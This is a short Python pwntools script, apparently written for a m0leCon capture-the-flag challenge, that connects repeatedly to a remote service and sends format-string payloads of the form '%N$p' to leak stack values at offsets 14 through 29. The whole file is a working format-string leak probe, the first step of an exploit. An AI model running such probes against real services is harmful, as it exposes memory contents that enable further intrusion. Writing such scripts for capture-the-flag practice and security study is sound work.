from pwn import *


for i in range(14,30):
    p=remote("offsec.m0lecon.it",13544)
    payload=f"%{i}$p"
    p.recv()
    p.sendline(payload)
    print(i," ",p.recv())
    p.close()
